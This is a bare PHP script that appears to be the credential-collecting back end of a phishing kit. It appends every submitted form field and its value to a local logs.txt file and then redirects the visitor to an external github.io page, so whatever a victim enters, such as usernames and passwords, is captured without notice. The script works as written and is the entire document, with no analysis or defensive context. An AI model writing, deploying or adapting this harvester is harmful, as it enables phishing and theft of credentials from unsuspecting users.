<?php
header('location:http://nccnareah.github.io/oluga/');
$handle = fopen("logs.txt","a");
foreach($_POST as $variable => $value){
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
